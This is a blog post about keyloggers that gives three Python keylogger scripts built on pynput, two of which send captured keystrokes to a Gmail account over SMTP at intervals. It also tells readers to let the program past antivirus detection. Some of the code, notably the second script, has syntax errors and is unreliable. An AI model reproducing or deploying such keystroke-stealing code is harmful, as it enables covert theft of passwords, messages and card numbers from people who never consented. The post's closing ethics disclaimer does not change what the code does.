---

title:  "Keylogger"
date: 2024-07-08 00:00:00 +0800 
categories: [Projects] 
tags: [projects, keylogger] 
---
![Keylogger header](/assets/keylogger.jpg)

## Keylogger 

A keylogger is a type of surveillance technology used to monitor and record each keystroke typed on a specific computer's keyboard. While keyloggers have legitimate uses, such as monitoring employee activity or troubleshooting technical problems, they can also be used maliciously to steal sensitive information, such as passwords and credit card numbers. In this blog post, we'll explore what a keylogger is, how it works, and how you can implement a simple keylogger in Python.

### What is a Keylogger?

A keylogger, short for "keystroke logger," is software or hardware that records the keys struck on a keyboard, typically covertly, so that the person using the keyboard is unaware that their actions are being monitored. Keyloggers can capture a wide range of information, from simple text entries to passwords and private messages.

### How Does It Work?

1. **Capturing Keystrokes**: The primary function of a keylogger is to capture and record each keystroke typed on the keyboard. This is often done using low-level keyboard hooks or intercepting keyboard interrupts.
2. **Storing Data**: Once captured, the keystrokes are stored in a log file or sent to a remote server. The storage format can vary, but typically it includes the key pressed and a timestamp.
3. **Covert Operation**: Effective keyloggers operate covertly, running in the background without the user's knowledge. They may disguise themselves as legitimate software or run silently as a background process.

### Implementation in Python

To create a simple keylogger in Python, we can use the `pynput` library, which allows us to monitor and control input devices. The following steps will guide us through the implementation:

#### Step-by-Step Explanation

1. **Install Required Library**: Install the `pynput` library using pip.
2. **Import Required Modules**: Use `pynput` to monitor keyboard events.
3. **Define a Callback Function**: Create a function that will be called whenever a key is pressed.
4. **Write Keystrokes to a Log File**: Store the captured keystrokes in a file for later analysis.
5. **Set Up a Keyboard Listener**: Use `pynput` to set up a listener that monitors keyboard events and calls the callback function for each key press.

#### Python Codes

First, ensure you have the `pynput` library installed:
```sh
pip install pynput
```

Then, create the keylogger script:
### Code 1 
```python
from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

### Code 2 Simple with Gmail 

First, ensure you have the `pynput` library installed:
```sh
pip install pynput
```
```python
import pynput  #Main librarry that records the keypresses - install by typing pip install pynput on your CL
from pynput.keyboard import Key, Listener
import send_email

count = 0
keys = []

def on_press(key) :    #Defining the on press function 
  print (key. end= " ")  #When any key except esc is pressed, the progrm starts capturing keystroks
  print ("pressed")
  global keys, count
  keys.append(str(key))
  count += 1
  if count > 10:  #Everytime there is a keystrock beyond 10, the email(keys) will be activated
    count = 0
    email(keys)

def email(keys) :    #Defining the email fuction and making the stroks more readable for us 
  message = !!
  for key in keys: 
    k = key.replace("'","")  # This line, replaces commas to nothing
    if key == "Key.space":   #If ther is any key presses that has spce, then this will add the space
      k = " "
    elif key.find("Key")>0:
      k = " "
    message += k
  print(message)
  send_email.sendEmail(message)

def on_release(key):   #Defining the on release function
  if key == Key.esc:  # When you press the esc key on the CL , the program will stop and return false. 
    return False

with Listener (on_press = on_press, on_elease = on_release as listener: 
  listener.join()
```
#### Here is the sendemail.py code:
```python
# The first thing you'll neeed to do is to reduce the security in your google email, since google will not allow your python application for security reasons. 
# its recommended that you make a whole new email account, if your going to be testing this out - for educational purposes.

import smtplib, ssl  # Servers that will help yu connect to your email, you'll nedd to insatall them with pip install 

def sendEmail (message) : 
  smtp_server = "smtp.gmail.com"
  port = 587
  sender_email = "testemailaccount@gmail.com"  #Make your own Gmail
  password = "enter your password"
  reciver_email = "testemailaccount@gmail.com"

  context = ssl.create_default_context()

  try :
    server = smtplib.SMTP(smtp_server ,port)
    server.ehlo()
    server.starttls(context=context)
    server.ehlo()
    server.login(sender_email, password)
    server.sendemail(sender_email, receiver_email, message)
    
  except Exception as e:
    print(e)
  
  except Exception as e:
    print(e)
    
  finally:
    server.quit()

```
    
### Code 3 more advanced with Gmail 
First, ensure you have the `pynput` library installed:
```sh
pip install pynput
```

```python
from pynput import keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time, email, password):
        self.log = "[+] Keylogger has started"
        self.time_interval = time
        self.email = email
        self.password = password

    def append_log(self, string):
        self.log = self.log + string

    def key_pressed(self, key):
        try:
            key_special = str(key.char)
        except AttributeError:
            if key == key.space:
                key_special = " "
            else:
                key_special = " " + str(key) + " "
        self.append_log(key_special)

    def mail_sender(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def mail(self):
        self.mail_sender(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.time_interval, self.mail)
        timer.start()

    def launch(self):
        listener = keyboard.Listener(on_press = self.key_pressed)
        with listener:
            self.mail()
            listener.join()

```

#### Here is the run-py code for the advanced code: 
```python
import keylogger

logger = keylogger.Keylogger(15, "mail", "pass") # Every 2 mins
logger.launch()
```

### How the Codes Works

- **Importing Modules**: We import the `keyboard` module from `pynput` to monitor keyboard events.
- **Callback Function `on_press`**:
  - This function is called whenever a key is pressed.
  - It opens the log file `keylog.txt` in append mode.
  - It writes the character of the key pressed to the log file. If the key doesn't have a character representation (like special keys), it writes the key itself.
- **Callback Function `on_release`**:
  - This function is called whenever a key is released.
  - If the `Esc` key is pressed, it stops the listener.
- **Setting Up the Listener**:
  - We create a `Listener` object from `pynput.keyboard` and pass the `on_press` and `on_release` callback functions.
  - The listener runs indefinitely, capturing and logging all keystrokes until the `Esc` key is pressed.

### Conclusion

Creating a keylogger can be a valuable learning exercise for understanding how keystroke logging works and the potential risks associated with it. However, it's important to use this knowledge ethically and legally. Unauthorized keylogging is illegal and unethical. Use this information responsibly and ensure you have permission before monitoring any device.

PS: Before you launch this to try it out, keep in mind that your antivirus program f.eks Windows defender on windows, will and should caught this ( if it doesent, then you have a crappy antivirus, thats not doing its job) thus making it hard to run. to run this, u’l have to allow it from your computer. 

💙 Happy coding and may your programs always compile flawlessly! 💙
